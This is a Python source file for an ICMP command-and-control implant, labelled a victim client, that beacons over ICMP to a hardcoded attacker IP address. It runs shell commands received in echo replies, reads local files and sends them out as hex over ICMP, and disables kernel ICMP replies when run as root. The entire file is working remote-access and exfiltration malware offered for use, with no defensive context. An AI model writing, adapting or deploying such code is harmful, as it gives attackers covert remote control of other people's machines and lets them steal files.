"""
ICMP C2 Client
"""

from scapy.all import Raw, send, AsyncSniffer
from scapy.layers.inet import IP, ICMP
import os
import subprocess
import time
import logging
import hashlib
import sys
import argparse

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configuration - can be overridden via command line
ATTACKER_IP = None  # Must be specified
BEACON_INTERVAL = 3  # seconds between beacons
MAX_PAYLOAD_SIZE = 1200  # Max bytes per ICMP packet fragment
seq_num = 0
last_output = "BEACON_INIT"  # Initial beacon message
output_queue = []  # Queue of fragments to send

ATTACKER_IP = "107.20.91.118"
BEACON_INTERVAL = 3  # seconds between beacons
MAX_PAYLOAD_SIZE = 1200  # Max bytes per ICMP packet fragment
seq_num = 0
last_output = "BEACON_INIT"  # Initial beacon message
output_queue = []  # Queue of fragments to send


def fragment_output(data, fragment_id):
    """Fragment large output into chunks with protocol headers"""
    fragments = []

    if len(data) <= MAX_PAYLOAD_SIZE - 50:  # Single fragment (account for header)
        # Format: SINGLE|<data>
        fragments.append(f"SINGLE|{data}")
    else:
        # Calculate total fragments needed
        chunk_size = MAX_PAYLOAD_SIZE - 50  # Account for header overhead
        total_fragments = (len(data) + chunk_size - 1) // chunk_size

        # Create checksum for reassembly verification
        checksum = hashlib.md5(
            data.encode() if isinstance(data, str) else data
        ).hexdigest()[:8]

        for i in range(total_fragments):
            start = i * chunk_size
            end = min(start + chunk_size, len(data))
            chunk = data[start:end]

            # Format: FRAG|<frag_id>|<current>/<total>|<checksum>|<data>
            header = f"FRAG|{fragment_id}|{i + 1}/{total_fragments}|{checksum}|"
            fragments.append(header + chunk)

        print(
            f"[*] Fragmented output into {total_fragments} parts (checksum: {checksum})"
        )

    return fragments


def handle_command(cmd):
    """Execute command and return result"""
    global output_queue

    try:
        result = ""

        # Send file to attacker
        if cmd.startswith("send "):
            filename = cmd.split(" ", 1)[1]
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    data = f.read()
                result = data.hex()  # send as hex string
                print(f"[+] Sending file: {filename} ({len(data)} bytes)")
            else:
                result = "FILE_NOT_FOUND"
        # Run command on victim
        elif cmd.startswith("run "):
            os.system(cmd.split(" ", 1)[1])
            result = "EXECUTED"
        elif cmd == "":
            # Empty command, use whatever is in queue or last_output
            return
        else:
            result = subprocess.getoutput(cmd)
            if not result:
                result = "Command executed (no output)"
            print(f"[+] Command executed: {cmd}")

        # Fragment the output and add to queue
        fragment_id = str(seq_num)[:8]  # Use sequence number as fragment ID
        fragments = fragment_output(result, fragment_id)
        output_queue.extend(fragments)
        print(f"[*] Added {len(fragments)} fragment(s) to queue")

    except Exception as e:
        output_queue.append(f"SINGLE|ERROR: {str(e)}")


def send_beacon_and_wait():
    """Send beacon and wait for reply in one operation to avoid race conditions"""
    global seq_num, last_output, output_queue

    # Record start time to enforce beacon interval
    start_time = time.time()

    print(f"[*] Sending beacon #{seq_num} to {ATTACKER_IP}")

    # Start listening BEFORE sending to avoid missing the reply

    # Start sniffer in background
    sniffer = AsyncSniffer(
        filter=f"icmp and src host {ATTACKER_IP}",
        count=1,
        timeout=BEACON_INTERVAL,
        store=True,
    )
    sniffer.start()

    # Small delay to ensure sniffer is ready
    time.sleep(0.1)

    # Determine what to send in this beacon
    if output_queue:
        # Send next fragment from queue
        output_to_send = output_queue.pop(0)
        print(f"[*] Sending fragment ({len(output_queue)} remaining in queue)")
        # Update status for next beacon
        if output_queue:
            last_output = f"READY|fragments_pending:{len(output_queue)}"
        else:
            last_output = "READY|queue_empty"
    else:
        # Send status beacon
        output_to_send = last_output

    pkt = (
        IP(dst=ATTACKER_IP)
        / ICMP(type=8, id=os.getpid() & 0xFFFF, seq=seq_num)
        / output_to_send
    )
    send(pkt, verbose=False)
    seq_num += 1

    # Wait for sniffer to finish
    sniffer.join(timeout=BEACON_INTERVAL + 0.5)
    results = sniffer.results

    # Process reply if received
    if results and len(results) > 0:
        pkt = results[0]
        if pkt.haslayer(ICMP) and pkt[ICMP].type == 0:
            if pkt.haslayer(Raw):
                cmd = pkt[Raw].load.decode(errors="ignore").strip()
                if cmd:
                    print(f"[+] Command received: {cmd}")
                    handle_command(cmd)
                    # Status will be updated after next fragment is sent
                    # This prevents stale "fragments_pending" messages
                else:
                    print("[*] Empty reply (no command)")
            else:
                print("[*] Reply with no payload")
        else:
            print(f"[DEBUG] Got ICMP type {pkt[ICMP].type}, expected type 0")
    else:
        print("[*] No reply received (timeout)")

    # Enforce minimum beacon interval
    elapsed = time.time() - start_time
    if elapsed < BEACON_INTERVAL:
        sleep_time = BEACON_INTERVAL - elapsed
        print(f"[*] Waiting {sleep_time:.1f}s to maintain beacon interval...")
        time.sleep(sleep_time)


def main():
    """Main beacon loop"""
    global ATTACKER_IP, BEACON_INTERVAL

    # Parse command line arguments
    parser = argparse.ArgumentParser(description="ICMP C2 Victim - Beacon to attacker")
    parser.add_argument("attacker_ip", nargs="?", help="Attacker IP address")
    parser.add_argument(
        "-i",
        "--interval",
        type=int,
        default=3,
        help="Beacon interval in seconds (default: 3)",
    )
    args = parser.parse_args()

    if args.attacker_ip:
        ATTACKER_IP = args.attacker_ip

    if not ATTACKER_IP:
        print("[!] ERROR: Attacker IP required!")
        print("Usage: python3 victim_icmp.py <attacker_ip> [-i interval]")
        print("Example: python3 victim_icmp.py 213.57.121.34")
        print("Example: python3 victim_icmp.py 213.57.121.34 -i 5")
        sys.exit(1)

    BEACON_INTERVAL = args.interval

    print(f"[*] Victim started - beaconing to {ATTACKER_IP} every {BEACON_INTERVAL}s")
    print("[*] Waiting for commands via ICMP replies...")

    # Kernel ICMP reply suppression (Linux-specific)
    if os.name == "posix":
        try:
            if os.geteuid() == 0:
                os.system(
                    "echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 2>/dev/null"
                )
                print("[*] Kernel ICMP replies disabled")
            else:
                print(
                    "[!] Warning: Not running as root, kernel ICMP replies may interfere"
                )
        except Exception:
            pass

    while True:
        try:
            send_beacon_and_wait()
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(BEACON_INTERVAL)


if __name__ == "__main__":
    main()
